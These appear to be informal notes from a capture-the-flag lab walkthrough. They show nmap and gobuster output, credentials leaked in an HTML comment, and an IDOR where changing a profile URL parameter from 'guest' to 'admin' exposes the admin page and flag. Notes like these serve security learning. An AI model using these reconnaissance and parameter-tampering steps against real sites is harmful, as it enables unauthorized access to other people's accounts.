Ip 10.10.47.0

nmap:

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack



PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 08:81:96:b8:17:2a:04:dc:5c:15:ce:6e:f1:b4:bd:3f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDBpD14q9c4pi1bk7tJQfpzSimmSmroSRNHD3g1KFo+scXx9GQfzVpI8MH3rFZgJ2EEveYetUl/HWSExJoIYfyaPSQMeMyCOMD5ZLe4vDB9mL/KjYBpBqRDdt7BOo3cnmn3Qb8C/I3g3FyY96EZsGQ8xapZzDrtdZdwFQHz2LtWtvXGsOuJpcAHmsKuEXXlebIyBa+c6iCVaOy1TOz41Slm9Goic1X5dvc8sZ3gDwjqS85iRei+IZApJimJk41dO+RTzAtGO98M777duKlD1dff5aDPyHJK3pN6Iy2yyGFeh1YWZKSjPqLkLBA6k4sAYMeeY0DU87fiQgoFEearVJdzRGaVBgF/B88cWjcE1ordLyZhEm7dssvuj1W80NUDXo/V+e2AE/CfJ394sUbm0aZNbLjsrSYz+us6XSUIumfytwKmkl2ZPzM9Et7TbbYPtJfuTENLXI8O4ws75jFqS/o+G6nuegQ+Uvm8fb36olceJwZtZuwnw4/FCep1Y/0qVWU=
|   256 7e:a9:cd:32:81:ab:66:07:3f:6b:0b:22:f8:26:71:cc (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJfrdtwqp20siJRlPKut1BEW6lGPo3T/hyjFrrPwNL8RB7Yg9BOvrVwl72WTVHISrKenmltZbTmtVnCAFRpTjfE=
|   256 7f:61:22:12:c7:57:ed:e2:32:fd:cc:82:cf:c6:5f:84 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEsjqiRsPneNGAzSmTOYBpA8/1qguz7r9LuZsiudcDn+
80/tcp open  http    syn-ack Apache httpd 2.4.53 ((Debian))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.53 (Debian)
|_http-title: Login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel



gobustttter:

/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/assets (Status: 301)
/db (Status: 301)
/index.php (Status: 200)
/server-status (Status: 403)


siiite on port 80:

<!-- use guest:guest credentials until registration is fixed. "admin" user account is off limits!!!!! -->

http://10.10.47.0/profile.php?user=guest

IDOR found

http://10.10.47.0/profile.php?user=admin 

read flag.